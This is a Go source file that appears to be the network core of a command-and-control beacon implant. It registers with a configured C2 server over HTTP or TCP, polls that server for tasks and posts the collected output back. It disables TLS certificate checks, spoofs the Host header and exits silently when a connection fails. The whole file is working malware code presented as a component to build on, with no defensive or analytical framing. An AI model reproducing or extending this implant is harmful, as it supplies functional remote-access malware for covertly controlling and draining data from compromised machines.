package core

import (
	"bytes"
	"crypto/tls"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"time"
)

var (
	Client = &http.Client{
		Timeout:   10*time.Second,
		Transport: &http.Transport{
			Proxy: func(*http.Request) (*url.URL, error) {
				if ProxyURL == "" {return nil, nil}
				return url.Parse(ProxyURL)
			},
			TLSHandshakeTimeout: 10*time.Second,
			TLSClientConfig:	 &tls.Config{InsecureSkipVerify: true},
		},
	}
)

func init() {
	if strings.HasPrefix(C2_URL, "tcp") {
		TCP(JoinBytes(_IntToByte(4, len(MetaByte)+4), _IntToByte(4, BeaconID), MetaByte))
	} else {
		SetProperty(PullInfo, "MetaData", MetaByte)
		SetProperty(PushInfo, "BeaconID", []byte(strconv.Itoa(BeaconID)))
		HTTP("GET", GetURL(PullInfo), GetHeader(PullInfo), nil, func(){os.Exit(0)})
	}
}

func TCP(Data []byte) {
	Sleep, Jitter = 0, 0
	Addr := strings.TrimPrefix(C2_URL, "tcp://")
	if strings.HasPrefix(Addr, "0.0.0.0") || strings.HasPrefix(Addr, "127.0.0.1") {
		ln, err := net.Listen("tcp", Addr)
		if err != nil { os.Exit(0) }
		go func() {
			for {
				Conn, _ := ln.Accept()
				if _, OK := Tunnel.Load(BeaconID); OK {
					Conn.Close()
				} else {
					_, err = Conn.Write(Data)
					if err != nil { Conn.Close(); continue }
					Tunnel.Store(BeaconID, Conn)
				}
			}
		}()
	} else {
		Conn, err := net.Dial("tcp", Addr)
		if err != nil { os.Exit(0) }
		_, err = Conn.Write(Data)
		if err != nil { os.Exit(0) }
		Tunnel.Store(BeaconID, Conn)
	}
}

func HTTP(Method, URL string, Header map[string]string, Body io.Reader, Error func()) ([]byte, error) {
	Req, _ := http.NewRequest(Method, URL, Body)
	for Key, Value := range Header {
		if Key == "Host" {
			Req.Host = Value
		} else {
			Req.Header.Set(Key, Value)
		}
	}
	Res, err := Client.Do(Req)
	if err != nil { Error(); return nil, err }
	defer Res.Body.Close()
	return io.ReadAll(Res.Body)
}

func Pull() *bytes.Buffer {
	time.Sleep(GetWaitTime())
	if strings.HasPrefix(C2_URL, "http") {
		Data, _ := HTTP("GET", GetURL(PullInfo), GetHeader(PullInfo), nil, func(){})
		return ParseBytes(GetOutput(Data))
	}
	if Conn, OK := Tunnel.Load(BeaconID); strings.HasPrefix(C2_URL, "tcp") && OK {
		Len := _ByteToInt(ReadFrom(Conn.(net.Conn), 4))
		return ParseBytes(ReadFrom(Conn.(net.Conn), Len))
	}
	return nil
}

func Push() {
	time.Sleep(200*time.Millisecond)
	WriteLock(func() {
		if Conn, OK := Tunnel.Load(BeaconID); strings.HasPrefix(C2_URL, "tcp") && OK {
			_, err := Conn.(net.Conn).Write(_IntToByte(4, Buffer.Len()))
			if err != nil { Tunnel.Delete(BeaconID) }
			if Buffer.Len() > 0 {
				io.Copy(Conn.(net.Conn), &Buffer)
			}
		}
		if strings.HasPrefix(C2_URL, "http") && Buffer.Len() > 0 {
			HTTP("POST", GetURL(PushInfo), GetHeader(PushInfo), SetOutput(Buffer.Bytes()), func(){})
		}
		FileID.Range(func(FID, _ interface{}) bool {
			FileID.Store(FID, true); return true
		})
		Buffer.Reset()
	})
}